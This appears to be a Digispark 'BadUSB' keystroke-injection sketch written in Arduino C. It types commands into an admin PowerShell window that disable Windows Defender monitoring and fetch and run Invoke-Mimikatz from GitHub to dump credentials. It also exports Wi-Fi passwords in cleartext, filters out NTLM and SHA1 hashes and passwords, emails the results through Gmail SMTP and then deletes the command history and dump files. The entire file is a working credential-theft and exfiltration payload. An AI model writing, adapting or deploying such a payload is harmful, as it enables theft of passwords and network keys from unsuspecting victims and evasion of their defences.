#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); // on-board led for model A
}

void loop() {
  
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  
  DigiKeyboard.println("powershell -exec bypass -command \"mode con cols=18 lines=1\"");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("cd $env:temp");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println(F("Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1'); Invoke-Mimikatz | Out-File -FilePath dmp_mimi;"));
  DigiKeyboard.delay(30000); // Defender kills the process - opening a new window

  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  
  DigiKeyboard.println("powershell -exec bypass -command \"mode con cols=18 lines=1\"");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("cd $env:temp");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cmd /k netsh wlan export profile key=clear");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Select-String -Path WLAN*.xml -Pattern 'keyMaterial' > dmp_wifi");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("Select-String -Path dmp_mimi -Pattern Username,NTLM,SHA1,Domain,Password > dmp_mimi2");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println(F("$SMTPServer = 'smtp.gmail.com'; $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('<email>', '<password>'); $ReportEmail = New-Object System.Net.Mail.MailMessage"));
  DigiKeyboard.delay(3000);
  DigiKeyboard.println(F("$ReportEmail.From = '<email>'; $ReportEmail.To.Add('<email>'); $ReportEmail.Subject = 'new minidump'; $ReportEmail.Body = Get-Content dmp_mimi2; $SMTPInfo.Send($ReportEmail);"));
  DigiKeyboard.delay(3000);
  DigiKeyboard.println(F("$ReportEmail.From = '<email>'; $ReportEmail.To.Add('<email>'); $ReportEmail.Subject = 'new wifidump'; $ReportEmail.Body = Get-Content dmp_wifi; $SMTPInfo.Send($ReportEmail); Remove-Item (Get-PSReadlineOption).HistorySavePath;"));
  DigiKeyboard.delay(3000);
  DigiKeyboard.println("del dmp*");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("exit");
  
  digitalWrite(1, HIGH); // LED indicator, ready to remove
  DigiKeyboard.delay(20000);
  
}
